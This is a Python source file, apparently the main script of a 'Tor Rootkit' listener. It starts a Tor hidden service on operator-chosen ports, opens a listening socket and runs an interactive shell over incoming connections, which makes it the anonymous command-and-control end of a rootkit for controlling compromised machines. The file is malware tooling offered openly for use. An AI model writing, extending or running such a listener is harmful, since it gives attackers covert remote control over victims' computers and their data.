#!/usr/bin/env python3
from network import ListenerSocket, Tor
from shell import ListenerShell
from shell_ui.style import Style
from argparse import ArgumentParser
import shell_ui.ascii_art as banner


class Listener(Style):
    """
    The main class of the listener Package.
    It handles all other modules of the listener package.
    """

    def __init__(self):
        listener_port, forward_port = Listener.parse_args()
        self.torHS = Tor('listener', listener_port, forward_port)
        listener_socket = ListenerSocket(forward_port)
        listener_socket.start()
        shell = ListenerShell(listener_socket)
        shell.run()

    @staticmethod
    def parse_args():
        """
        Read the command line args of the programm call and parse them.
        """
        parser = ArgumentParser(description='Python3 Tor Rootkit Listener')
        parser.add_argument('hidden_service_port', type=int, help='The port the hidden service should listen on.')
        parser.add_argument('local_port', type=int, help='The port the hidden service should forward to.')
        args = parser.parse_args()
        return args.hidden_service_port, args.local_port

    def __del__(self):
        try:
            self.torHS.torProcess.terminate()
        except AttributeError:
            pass
        else:
            self.negSysMsg('Terminated Tor Process')
        finally:
            self.negSysMsg('Exiting')


if __name__ == '__main__':
    banner.draw()
    Listener()
